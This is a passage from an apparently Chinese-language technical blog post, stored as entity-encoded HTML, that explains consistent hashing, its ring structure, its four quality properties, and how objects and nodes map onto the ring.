K&#x662F;&#x5173;&#x952E;&#x5B57;&#x7684;&#x6570;&#x91CF;&#xFF0C;n&#x662F;&#x69FD;&#x4F4D;&#x6570;&#x91CF;&#x3002;<strong>&#x7136;&#x800C;&#x5728;&#x4F20;&#x7EDF;&#x7684;&#x54C8;&#x5E0C;&#x8868;&#x4E2D;&#xFF0C;&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x69FD;&#x4F4D;&#x7684;&#x51E0;&#x4E4E;&#x9700;&#x8981;&#x5BF9;&#x6240;&#x6709;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x6620;&#x5C04;&#x3002;</strong></p>\n<p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7531;MIT&#x7684;Karger&#x53CA;&#x5176;&#x5408;&#x4F5C;&#x8005;&#x63D0;&#x51FA;&#xFF0C;&#x73B0;&#x5728;&#x8FD9;&#x4E00;&#x601D;&#x60F3;&#x5DF2;&#x7ECF;&#x6269;&#x5C55;&#x5230;&#x5176;&#x5B83;&#x9886;&#x57DF;&#x3002;&#x5728;&#x8FD9;&#x7BC7;1997&#x5E74;&#x53D1;&#x8868;&#x7684;&#x5B66;&#x672F;&#x8BBA;&#x6587;&#x4E2D;&#x4ECB;&#x7ECD;&#x4E86;&#x201C;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x201D;&#x5982;&#x4F55;&#x5E94;&#x7528;&#x4E8E;&#x7528;&#x6237;&#x6613;&#x53D8;&#x7684;&#x5206;&#x5E03;&#x5F0F;Web&#x670D;&#x52A1;&#x4E2D;&#x3002;&#x54C8;&#x5E0C;&#x8868;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x5728;&#x7CFB;&#x7EDF;&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x8282;&#x70B9;&#x53EA;&#x9700;&#x8981;&#x79FB;&#x52A8; K/n&#x9879;&#x3002;</p>\n<p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x4E5F;&#x53EF;&#x7528;&#x4E8E;&#x5B9E;&#x73B0;&#x5065;&#x58EE;&#x7F13;&#x5B58;&#x6765;&#x51CF;&#x5C11;&#x5927;&#x578B;Web&#x5E94;&#x7528;&#x4E2D;&#x7CFB;&#x7EDF;&#x90E8;&#x5206;&#x5931;&#x6548;&#x5E26;&#x6765;&#x7684;&#x8D1F;&#x9762;&#x5F71;&#x54CD;&#x3002;</p>\n<p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7684;&#x6982;&#x5FF5;&#x8FD8;&#x88AB;&#x5E94;&#x7528;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6563;&#x5217;&#x8868;&#xFF08;DHT&#xFF09;&#x7684;&#x8BBE;&#x8BA1;&#x3002;DHT&#x4F7F;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x6765;&#x5212;&#x5206;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x7684;&#x8282;&#x70B9;&#x3002;&#x6240;&#x6709;&#x5173;&#x952E;&#x5B57;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x8986;&#x76D6;&#x7F51;&#x7EDC;&#x9AD8;&#x6548;&#x5730;&#x5B9A;&#x4F4D;&#x5230;&#x67D0;&#x4E2A;&#x8282;&#x70B9;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4F7F;&#x7528;&#x573A;&#x666F;\"><a href=\"#&#x4F7F;&#x7528;&#x573A;&#x666F;\" class=\"headerlink\" title=\"&#x4F7F;&#x7528;&#x573A;&#x666F;\"></a>&#x4F7F;&#x7528;&#x573A;&#x666F;</h3><p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x907F;&#x514D;&#x4E0A;&#x9762;&#x6240;&#x8BF4;&#x5230;&#x7684;&#x65B0;&#x589E;&#x6216;&#x51CF;&#x5C11;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x5927;&#x91CF;&#x670D;&#x52A1;&#x5668;&#x7F13;&#x5B58;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x66F4;&#x65B0;&#x7684;&#x95EE;&#x9898;&#x3002; </p>\n<p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x5C3D;&#x53EF;&#x80FD;&#x4F7F;&#x540C;&#x4E00;&#x4E2A;&#x8D44;&#x6E90;&#x6620;&#x5C04;&#x5230;&#x540C;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x8981;&#x6C42;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x65B0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5C3D;&#x91CF;&#x5206;&#x62C5;&#x5B58;&#x50A8;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x8D44;&#x6E90;&#x3002;&#x51CF;&#x5C11;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x4E5F;&#x53EF;&#x4EE5;&#x5C3D;&#x91CF;&#x5206;&#x62C5;&#x5B58;&#x50A8;&#x5B83;&#x7684;&#x7F13;&#x5B58;&#x8D44;&#x6E90;&#x3002; </p>\n<p><strong>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x7684;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#x662F;&#x5C06;&#x6BCF;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x54C8;&#x5E0C;&#x503C;&#x57DF;&#x533A;&#x95F4;&#x5173;&#x8054;&#x8D77;&#x6765;&#xFF0C;&#x5176;&#x4E2D;&#x533A;&#x95F4;&#x8FB9;&#x754C;&#x901A;&#x8FC7;&#x8BA1;&#x7B97;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x5E94;&#x7684;&#x54C8;&#x5E0C;&#x503C;&#x6765;&#x51B3;&#x5B9A;&#x3002;</strong>&#xFF08;&#x5B9A;&#x4E49;&#x533A;&#x95F4;&#x7684;&#x54C8;&#x5E0C;&#x51FD;&#x6570;&#x4E0D;&#x4E00;&#x5B9A;&#x548C;&#x8BA1;&#x7B97;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x54C8;&#x5E0C;&#x503C;&#x7684;&#x51FD;&#x6570;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x662F;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x7684;&#x8303;&#x56F4;&#x9700;&#x8981;&#x5339;&#x914D;&#x3002;&#xFF09;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x79FB;&#x9664;&#xFF0C;&#x5219;&#x5B83;&#x4F1A;&#x4ECE;&#x5BF9;&#x5E94;&#x7684;&#x533A;&#x95F4;&#x4F1A;&#x88AB;&#x5E76;&#x5165;&#x5230;&#x90BB;&#x8FD1;&#x7684;&#x533A;&#x95F4;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x6539;&#x53D8;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x5B9E;&#x73B0;\"><a href=\"#&#x76F8;&#x5173;&#x5B9E;&#x73B0;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x5B9E;&#x73B0;\"></a>&#x76F8;&#x5173;&#x5B9E;&#x73B0;</h3><p>&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x5C06;&#x6BCF;&#x4E2A;&#x5BF9;&#x8C61;&#x6620;&#x5C04;&#x5230;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x7CFB;&#x7EDF;&#x518D;&#x5C06;&#x53EF;&#x7528;&#x7684;&#x8282;&#x70B9;&#x673A;&#x5668;&#x6620;&#x5C04;&#x5230;&#x5706;&#x73AF;&#x7684;&#x4E0D;&#x540C;&#x4F4D;&#x7F6E;&#x3002;</p>\n<p>&#x67E5;&#x627E;&#x67D0;&#x4E2A;&#x5BF9;&#x8C61;&#x5BF9;&#x5E94;&#x7684;&#x673A;&#x5668;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x5BF9;&#x8C61;&#x5BF9;&#x5E94;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x4F4D;&#x7F6E;&#xFF0C;&#x6CBF;&#x7740;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x67E5;&#x627E;&#x76F4;&#x5230;&#x9047;&#x5230;&#x67D0;&#x4E2A;&#x8282;&#x70B9;&#x673A;&#x5668;&#xFF0C;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x5373;&#x4E3A;&#x5BF9;&#x8C61;&#x5E94;&#x8BE5;&#x4FDD;&#x5B58;&#x7684;&#x4F4D;&#x7F6E;&#x3002; </p>\n<p><strong>&#x5220;&#x9664;</strong>&#x4E00;&#x53F0;&#x8282;&#x70B9;&#x673A;&#x5668;&#x65F6;&#xFF0C;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x4FDD;&#x5B58;&#x7684;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#x90FD;&#x8981;&#x79FB;&#x52A8;&#x5230;&#x4E0B;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x3002;<br><strong>&#x6DFB;&#x52A0;</strong>&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5230;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x67D0;&#x4E2A;&#x70B9;&#x65F6;&#xFF0C;&#x8FD9;&#x4E2A;&#x70B9;&#x7684;&#x4E0B;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x9700;&#x8981;&#x5C06;&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x524D;&#x5BF9;&#x5E94;&#x7684;&#x5BF9;&#x8C61;&#x79FB;&#x52A8;&#x5230;&#x65B0;&#x673A;&#x5668;&#x4E0A;&#x3002;<br><strong>&#x66F4;&#x6539;</strong>&#x5BF9;&#x8C61;&#x5728;&#x8282;&#x70B9;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x5206;&#x5E03;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x6574;&#x8282;&#x70B9;&#x673A;&#x5668;&#x7684;&#x4F4D;&#x7F6E;&#x6765;&#x5B9E;&#x73B0;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x7279;&#x6027;\"><a href=\"#&#x76F8;&#x5173;&#x7279;&#x6027;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7279;&#x6027;\"></a>&#x76F8;&#x5173;&#x7279;&#x6027;</h3><p>&#x4E00;&#x81F4;&#x6027;hash&#x7B97;&#x6CD5;&#x63D0;&#x51FA;&#x4E86;&#x5728;&#x52A8;&#x6001;&#x53D8;&#x5316;&#x7684;Cache&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x5224;&#x5B9A;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x597D;&#x574F;&#x7684;&#x56DB;&#x4E2A;&#x5B9A;&#x4E49;&#xFF1A;</p>\n<ul>\n<li><p><strong>&#x5E73;&#x8861;&#x6027;(Balance)</strong><br>&#x5E73;&#x8861;&#x6027;&#x662F;&#x6307;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x80FD;&#x591F;&#x5C3D;&#x53EF;&#x80FD;&#x5206;&#x5E03;&#x5230;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#x7A7A;&#x95F4;&#x90FD;&#x5F97;&#x5230;&#x5229;&#x7528;&#x3002;&#x5F88;&#x591A;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x90FD;&#x80FD;&#x591F;&#x6EE1;&#x8DB3;&#x8FD9;&#x4E00;&#x6761;&#x4EF6;&#x3002;</p>\n</li>\n<li><p><strong>&#x5355;&#x8C03;&#x6027;(Monotonicity)</strong><br>&#x5355;&#x8C03;&#x6027;&#x662F;&#x6307;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;&#x4E00;&#x4E9B;&#x5185;&#x5BB9;&#x901A;&#x8FC7;&#x54C8;&#x5E0C;&#x5206;&#x6D3E;&#x5230;&#x4E86;&#x76F8;&#x5E94;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#xFF0C;&#x53C8;&#x6709;&#x65B0;&#x7684;&#x7F13;&#x51B2;&#x52A0;&#x5165;&#x5230;&#x7CFB;&#x7EDF;&#x4E2D;&#x3002;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x5E94;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#x539F;&#x6709;&#x5DF2;&#x5206;&#x914D;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x539F;&#x6709;&#x7684;&#x6216;&#x8005;&#x65B0;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x800C;&#x4E0D;&#x4F1A;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x65E7;&#x7684;&#x7F13;&#x51B2;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x5176;&#x4ED6;&#x7F13;&#x51B2;&#x533A;&#x3002; </p>\n</li>\n<li><p><strong>&#x5206;&#x6563;&#x6027;(Spread)</strong><br>&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x7EC8;&#x7AEF;&#x6709;&#x53EF;&#x80FD;&#x770B;&#x4E0D;&#x5230;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#xFF0C;&#x800C;&#x662F;&#x53EA;&#x80FD;&#x770B;&#x5230;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x3002;&#x5F53;&#x7EC8;&#x7AEF;&#x5E0C;&#x671B;&#x901A;&#x8FC7;&#x54C8;&#x5E0C;&#x8FC7;&#x7A0B;&#x5C06;&#x5185;&#x5BB9;&#x6620;&#x5C04;&#x5230;&#x7F13;&#x51B2;&#x4E0A;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x540C;&#x7EC8;&#x7AEF;&#x6240;&#x89C1;&#x7684;&#x7F13;&#x51B2;&#x8303;&#x56F4;&#x6709;&#x53EF;&#x80FD;&#x4E0D;&#x540C;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x6700;&#x7EC8;&#x7684;&#x7ED3;&#x679C;&#x662F;&#x76F8;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x88AB;&#x4E0D;&#x540C;&#x7684;&#x7EC8;&#x7AEF;&#x6620;&#x5C04;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x663E;&#x7136;&#x662F;&#x5E94;&#x8BE5;&#x907F;&#x514D;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x5BFC;&#x81F4;&#x76F8;&#x540C;&#x5185;&#x5BB9;&#x88AB;&#x5B58;&#x50A8;&#x5230;&#x4E0D;&#x540C;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x964D;&#x4F4E;&#x4E86;&#x7CFB;&#x7EDF;&#x5B58;&#x50A8;&#x7684;&#x6548;&#x7387;&#x3002;&#x5206;&#x6563;&#x6027;&#x7684;&#x5B9A;&#x4E49;&#x5C31;&#x662F;&#x4E0A;&#x8FF0;&#x60C5;&#x51B5;&#x53D1;&#x751F;&#x7684;&#x4E25;&#x91CD;&#x7A0B;&#x5EA6;&#x3002;&#x597D;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5E94;&#x80FD;&#x591F;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#x53D1;&#x751F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C3D;&#x91CF;&#x964D;&#x4F4E;&#x5206;&#x6563;&#x6027;&#x3002; </p>\n</li>\n<li><p><strong>&#x8D1F;&#x8F7D;(Load)</strong><br>&#x8D1F;&#x8F7D;&#x95EE;&#x9898;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x4ECE;&#x53E6;&#x4E00;&#x4E2A;&#x89D2;&#x5EA6;&#x770B;&#x5F85;&#x5206;&#x6563;&#x6027;&#x95EE;&#x9898;&#x3002;&#x65E2;&#x7136;&#x4E0D;&#x540C;&#x7684;&#x7EC8;&#x7AEF;&#x53EF;&#x80FD;&#x5C06;&#x76F8;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x6620;&#x5C04;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x800C;&#x8A00;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x88AB;&#x4E0D;&#x540C;&#x7684;&#x7528;&#x6237;&#x6620;&#x5C04;&#x4E3A;&#x4E0D;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x4E0E;&#x5206;&#x6563;&#x6027;&#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E5F;&#x662F;&#x5E94;&#x5F53;&#x907F;&#x514D;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x597D;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5E94;&#x80FD;&#x591F;&#x5C3D;&#x91CF;&#x964D;&#x4F4E;&#x7F13;&#x51B2;&#x7684;&#x8D1F;&#x8377;&#x3002;</p>\n</li>\n</ul>\n<hr>\n<p><strong>&#x63A5;&#x4E0B;&#x6765;&#x4E3B;&#x8981;&#x8BB2;&#x89E3;&#x4E00;&#x4E0B;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5177;&#x4F53;&#x662F;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x7684;.</strong></p>\n<h3 id=\"&#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;\"><a href=\"#&#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;\" class=\"headerlink\" title=\"&#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;\"></a>&#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;</h3><p>&#x6309;&#x7167;&#x5E38;&#x7528;&#x7684;hash&#x7B97;&#x6CD5;&#x6765;&#x5C06;&#x5BF9;&#x5E94;&#x7684;key&#x54C8;&#x5E0C;&#x5230;&#x4E00;&#x4E2A;&#x5177;&#x6709;2^32&#x6B21;&#x65B9;&#x4E2A;&#x6876;&#x7684;&#x7A7A;&#x95F4;&#x4E2D;&#xFF0C;&#x5373;0~(2^32)-1&#x7684;&#x6570;&#x5B57;&#x7A7A;&#x95F4;&#x4E2D;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x6570;&#x5B57;&#x5934;&#x5C3E;&#x76F8;&#x8FDE;&#xFF0C;&#x60F3;&#x8C61;&#x6210;&#x4E00;&#x4E2A;&#x95ED;&#x5408;&#x7684;&#x73AF;&#x5F62;&#x3002;&#x5982;&#x4E0B;&#x56FE;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/1.png\" alt=\"\"></p>\n<h3 id=\"&#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\"><a href=\"#&#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\" class=\"headerlink\" title=\"&#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\"></a>&#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;</h3><p>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C06;object1&#x3001;object2&#x3001;object3&#x3001;object4&#x56DB;&#x4E2A;&#x5BF9;&#x8C61;&#x901A;&#x8FC7;&#x7279;&#x5B9A;&#x7684;Hash&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x51FA;&#x5BF9;&#x5E94;&#x7684;key&#x503C;&#xFF0C;&#x7136;&#x540E;&#x6563;&#x5217;&#x5230;Hash&#x73AF;&#x4E0A;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br>Hash(object1) = key1&#xFF1B;<br>Hash(object2) = key2&#xFF1B;<br>Hash(object3) = key3&#xFF1B;<br>Hash(object4) = key4&#xFF1B;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/2.png\" alt=\"\"></p>\n<h3 id=\"&#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\"><a href=\"#&#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\" class=\"headerlink\" title=\"&#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;\"></a>&#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;</h3><p>&#x5728;&#x91C7;&#x7528;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x96C6;&#x7FA4;&#x4E2D;&#x5C06;&#x65B0;&#x7684;&#x673A;&#x5668;&#x52A0;&#x5165;&#xFF0C;&#x5176;&#x539F;&#x7406;&#x662F;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x4E0E;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x4E00;&#x6837;&#x7684;Hash&#x7B97;&#x6CD5;&#x5C06;&#x673A;&#x5668;&#x4E5F;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF08;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x673A;&#x5668;&#x7684;hash&#x8BA1;&#x7B97;&#x662F;&#x91C7;&#x7528;&#x673A;&#x5668;&#x7684;IP&#x6216;&#x8005;&#x673A;&#x5668;&#x552F;&#x4E00;&#x7684;&#x522B;&#x540D;&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#x503C;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x4EE5;&#x987A;&#x65F6;&#x9488;&#x7684;&#x65B9;&#x5411;&#x8BA1;&#x7B97;&#xFF0C;&#x5C06;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x5230;&#x79BB;&#x81EA;&#x5DF1;&#x6700;&#x8FD1;&#x7684;&#x673A;&#x5668;&#x4E2D;&#x3002;<br>&#x5047;&#x8BBE;&#x73B0;&#x5728;&#x6709;NODE1&#xFF0C;NODE2&#xFF0C;NODE3&#x4E09;&#x53F0;&#x673A;&#x5668;&#xFF0C;&#x901A;&#x8FC7;Hash&#x7B97;&#x6CD5;&#x5F97;&#x5230;&#x5BF9;&#x5E94;&#x7684;KEY&#x503C;&#xFF0C;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF0C;&#x5176;&#x793A;&#x610F;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;<br>Hash(NODE1) = KEY1;<br>Hash(NODE2) = KEY2;<br>Hash(NODE3) = KEY3;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/3.png\" alt=\"\"></p>\n<p>&#x901A;&#x8FC7;&#x4E0A;&#x56FE;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x5BF9;&#x8C61;&#x4E0E;&#x673A;&#x5668;&#x5904;&#x4E8E;&#x540C;&#x4E00;&#x54C8;&#x5E0C;&#x7A7A;&#x95F4;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x6309;&#x987A;&#x65F6;&#x9488;&#x8F6C;&#x52A8;object1&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE1&#x4E2D;&#xFF0C;object3&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE2&#x4E2D;&#xFF0C;object2&#x3001;object4&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE3&#x4E2D;&#x3002;&#x5728;&#x8FD9;&#x6837;&#x7684;&#x90E8;&#x7F72;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;hash&#x73AF;&#x662F;&#x4E0D;&#x4F1A;&#x53D8;&#x66F4;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x901A;&#x8FC7;&#x7B97;&#x51FA;&#x5BF9;&#x8C61;&#x7684;hash&#x503C;&#x5C31;&#x80FD;&#x5FEB;&#x901F;&#x7684;&#x5B9A;&#x4F4D;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x673A;&#x5668;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x627E;&#x5230;&#x5BF9;&#x8C61;&#x771F;&#x6B63;&#x7684;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x4E86;&#x3002;</p>\n<h3 id=\"&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;\"><a href=\"#&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;\" class=\"headerlink\" title=\"&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;\"></a>&#x673A;&#x5668;&#x7684;&#x5220;&#x9664;&#x4E0E;&#x6DFB;&#x52A0;</h3><p>&#x666E;&#x901A;hash&#x6C42;&#x4F59;&#x7B97;&#x6CD5;&#x6700;&#x4E3A;&#x4E0D;&#x59A5;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F;&#x5728;&#x6709;&#x673A;&#x5668;&#x7684;&#x6DFB;&#x52A0;&#x6216;&#x8005;&#x5220;&#x9664;&#x4E4B;&#x540E;&#x4F1A;&#x7167;&#x6210;&#x5927;&#x91CF;&#x7684;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x5931;&#x6548;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5927;&#x5927;&#x7684;&#x4E0D;&#x6EE1;&#x8DB3;&#x5355;&#x8C03;&#x6027;&#x4E86;&#x3002;&#x4E0B;&#x9762;&#x6765;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x5982;&#x4F55;&#x5904;&#x7406;&#x7684;&#x3002;</p>\n<ol>\n<li><p>&#x8282;&#x70B9;&#xFF08;&#x673A